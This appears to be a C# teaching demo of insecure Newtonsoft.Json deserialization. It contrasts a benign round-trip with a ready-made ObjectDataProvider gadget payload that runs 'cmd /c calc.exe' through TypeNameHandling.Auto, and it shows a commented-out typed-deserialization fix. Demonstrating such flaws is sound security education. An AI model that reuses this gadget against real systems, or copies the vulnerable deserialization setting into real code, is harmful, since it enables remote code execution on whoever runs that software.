using System;
using System.Reflection;
using System.Text;
using Newtonsoft.Json;
using System.Reflection;

namespace DeserializationTests
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Demostrating a benign serialization and desialization: ");

            // creating an instance of product
            Product product = new Product();
            product.Name = "Apple";
            product.Expiry = new DateTime(2008, 12, 28);
            product.Sizes = new string[] { "Small" };

            // serlize product
            string benignUserdata = JsonConvert.SerializeObject(product);
            // {
            //   "Name": "Apple",
            //   "Expiry": "2008-12-28T00:00:00",
            //   "Sizes": [
            //     "Small"
            //   ]
            // }
            
            string benignUserdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(benignUserdata));
            //Get data from base64
            byte[] benignUserdata_nob64 = Convert.FromBase64String(benignUserdata_b64);
            //Deserialize data
            string bengin_userdata_decoded = Encoding.UTF8.GetString(benignUserdata_nob64);
            Object obj = JsonConvert.DeserializeObject(bengin_userdata_decoded, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.Auto
            });

            Console.WriteLine(obj.ToString());
            Console.WriteLine("Demostrating a malcious serialization and desialization: ");
            Console.ReadLine();




            //Declare exploit
            string userdata = @"{
                '$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
                'MethodName':'Start',
                'MethodParameters':{
                            '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
                    '$values':['cmd', '/c calc.exe']
                },
                'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
            }";
            //Exploit to base64
            string userdata_b64 = Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(userdata));

            //Get data from base64
            byte[] userdata_nob64 = Convert.FromBase64String(userdata_b64);
            //Deserialize data
            string userdata_decoded = Encoding.UTF8.GetString(userdata_nob64);
            // vulnarable
            object obj_exploit = JsonConvert.DeserializeObject(userdata_decoded, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.Auto
            });
            // the fix 
            /*object obj_exploit = JsonConvert.DeserializeObject<Product>(userdata_decoded, new JsonSerializerSettings
            {
                TypeNameHandling = TypeNameHandling.Auto
            });*/
        }
    }
}